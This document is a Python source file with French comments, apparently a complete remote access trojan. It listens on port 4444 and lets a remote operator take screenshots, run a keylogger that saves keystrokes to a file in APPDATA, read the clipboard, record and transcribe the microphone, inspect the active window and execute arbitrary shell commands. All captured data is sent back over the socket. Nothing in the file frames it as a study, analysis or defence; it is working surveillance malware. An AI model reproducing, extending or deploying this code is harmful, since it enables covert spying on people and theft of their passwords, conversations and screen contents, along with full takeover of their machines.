import socket
import subprocess as sp
import asyncio
import pyautogui
import os
import time
import struct
import threading
import win32gui
import win32process
import psutil
from pynput import keyboard
import json
import pyperclip
import pyaudio
import wave
import speech_recognition as sr
from datetime import datetime

# Configuration réseau
host = "0.0.0.0"
port = 4444

# Keylogger
keylog_file = os.path.join(os.environ["APPDATA"], "keylog.json")
keylog_listener = None
keylog_buffer = []
last_minute = ""

if not os.path.exists(keylog_file):
    with open(keylog_file, "w", encoding="utf-8") as f:
        json.dump({}, f)

audio_recording = False
audio_frames = []

def save_keylog_buffer():
    global keylog_buffer, last_minute
    try:
        with open(keylog_file, "r", encoding="utf-8") as f:
            try:
                data = json.load(f)
                if not isinstance(data, dict):
                    data = {}
            except:
                data = {}

        if keylog_buffer:
            current_text = data.get(last_minute, "")
            current_text += "".join(keylog_buffer)
            data[last_minute] = current_text

            with open(keylog_file, "w", encoding="utf-8") as f:
                json.dump(data, f, indent=2, ensure_ascii=False)

            keylog_buffer = []

    except Exception as e:
        print(f"[!] Erreur en sauvegardant le buffer : {e}")

def on_press(key):
    global keylog_buffer, last_minute
    try:
        now = datetime.now()
        current_minute = now.strftime("%Y-%m-%d %H:%M")

        if current_minute != last_minute:
            save_keylog_buffer()
            last_minute = current_minute

        if hasattr(key, 'char') and key.char is not None:
            keylog_buffer.append(key.char)
        elif key == keyboard.Key.space:
            keylog_buffer.append(" ")
        elif key == keyboard.Key.enter:
            keylog_buffer.append("\n")
        elif key == keyboard.Key.backspace:
            if keylog_buffer:
                keylog_buffer.pop()
        else:
            keylog_buffer.append(f"<{key.name}>")

    except Exception as e:
        print(f"[!] Erreur keylogger: {e}")

def keylogger_thread():
    global keylog_listener
    keylog_listener = keyboard.Listener(on_press=on_press)
    keylog_listener.start()
    keylog_listener.join()

def take_screenshot():
    ip = socket.gethostbyname(socket.gethostname())
    hostname = socket.gethostname()
    timestamp = time.strftime("%Y%m%d-%H%M%S", time.localtime()) + f"-{int(time.time() * 1000) % 1000}"
    filename = f"{ip}_{hostname}_{timestamp}.png"
    screenshot_path = os.path.join("C:/Users/Public/Downloads", filename)
    pyautogui.screenshot().save(screenshot_path)
    return screenshot_path, filename

def get_active_window_info():
    try:
        window = win32gui.GetForegroundWindow()
        title = win32gui.GetWindowText(window)
        _, pid = win32process.GetWindowThreadProcessId(window)
        process = psutil.Process(pid)
        return f"Titre: {title}\nProcessus: {process.name()}\nPID: {pid}\nExécutable: {process.exe()}"
    except Exception as e:
        return f"Erreur: {str(e)}"

def get_clipboard_content():
    try:
        return pyperclip.paste()
    except Exception as e:
        print(f"Erreur presse-papiers : {e}")
        return None

def start_audio_recording(duration):
    global audio_recording, audio_frames
    audio_recording = True
    audio_frames = []
    audio = pyaudio.PyAudio()

    stream = audio.open(format=pyaudio.paInt16,
                        channels=1,
                        rate=44100,
                        input=True,
                        frames_per_buffer=1024)

    print(f"[*] Enregistrement audio pour {duration} secondes")
    for _ in range(0, int(44100 / 1024 * duration)):
        if audio_recording:
            audio_frames.append(stream.read(1024))
        else:
            break

    stream.stop_stream()
    stream.close()
    audio.terminate()

    if audio_recording:
        return save_audio_recording()
    return None

def save_audio_recording():
    global audio_frames
    if not audio_frames:
        return None

    directory = "audio_recordings"
    os.makedirs(directory, exist_ok=True)
    filename = os.path.join(directory, f"recording_{int(time.time())}.wav")

    wf = wave.open(filename, "wb")
    wf.setnchannels(1)
    wf.setsampwidth(pyaudio.get_sample_size(pyaudio.paInt16))
    wf.setframerate(44100)
    wf.writeframes(b"".join(audio_frames))
    wf.close()

    return filename

def transcribe_audio(filepath):
    try:
        recognizer = sr.Recognizer()
        with sr.AudioFile(filepath) as source:
            audio_data = recognizer.record(source)
            return recognizer.recognize_google(audio_data, language='fr-FR')
    except Exception as e:
        print(f"[!] Erreur transcription : {e}")
        return "[!] Transcription échouée"

async def execute_command(command):
    process = sp.Popen(command, shell=True, stdout=sp.PIPE, stderr=sp.PIPE, stdin=sp.PIPE, text=True)
    out, err = process.communicate()
    return out + err

async def handle_client(conn):
    global keylog_listener, audio_recording

    while True:
        try:
            command = conn.recv(1024).decode()
            if not command:
                break

            if command == "SCREENSHOT":
                screenshot_path, filename = take_screenshot()
                with open(screenshot_path, "rb") as file:
                    data = file.read()
                conn.sendall(struct.pack("!I", len(data)))
                conn.sendall(filename.encode().ljust(100))
                conn.sendall(data)

            elif command == "GET_ACTIVE_WINDOW":
                info = get_active_window_info()
                conn.send(info.encode())

            elif command == "START_KEYLOG":
                if keylog_listener is None or not keylog_listener.running:
                    thread = threading.Thread(target=keylogger_thread, daemon=True)
                    thread.start()
                    conn.send(b"Keylogger started")
                else:
                    conn.send(b"Keylogger already running")

            elif command == "STOP_KEYLOG":
                if keylog_listener:
                    keylog_listener.stop()
                    keylog_listener = None
                    conn.send(b"Keylogger stopped")
                else:
                    conn.send(b"No active keylogger")

            elif command == "GET_KEYLOGS":
                save_keylog_buffer()
                if os.path.exists(keylog_file):
                    with open(keylog_file, "r", encoding="utf-8") as f:
                        data = f.read()
                    conn.sendall(data.encode())
                else:
                    conn.sendall(b"[!] Aucun fichier de log trouve.")

            elif command == "GET_CLIPBOARD":
                clipboard_content = get_clipboard_content()
                conn.send(clipboard_content.encode() if clipboard_content else b"[!] Presse-papiers vide")

            elif command.startswith("START_AUDIO_RECORDING"):
                duration = int(command.split()[1])
                threading.Thread(target=start_audio_recording, args=(duration,)).start()
                conn.send(b"Audio recording started")

            elif command == "STOP_AUDIO_RECORDING":
                audio_recording = False
                filename = save_audio_recording()
                if filename:
                    with open(filename, "rb") as f:
                        audio_data = f.read()
                    conn.sendall(struct.pack("!I", len(audio_data)))
                    conn.sendall(os.path.basename(filename).encode().ljust(100))
                    conn.sendall(audio_data)
                else:
                    conn.sendall(b"[!] Aucun fichier audio a envoyer")

            elif command == "TRANSCRIBE_AUDIO":
                filename = save_audio_recording()
                if filename:
                    transcription = transcribe_audio(filename)
                    conn.send(transcription.encode())
                else:
                    conn.send(b"[!] Aucun enregistrement trouve pour transcription")

            else:
                result = await execute_command(command)
                conn.send(result.encode())

        except Exception as e:
            print(f"[!] Exception : {e}")
            break

    conn.close()
    print("[-] Connexion fermée")

async def main():
    s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    s.bind((host, port))
    s.listen(5)
    print(f"[*] En attente sur {host}:{port}")

    while True:
        conn, addr = s.accept()
        print(f"[+] Connexion de {addr[0]}")
        await handle_client(conn)

if __name__ == "__main__":
    asyncio.run(main())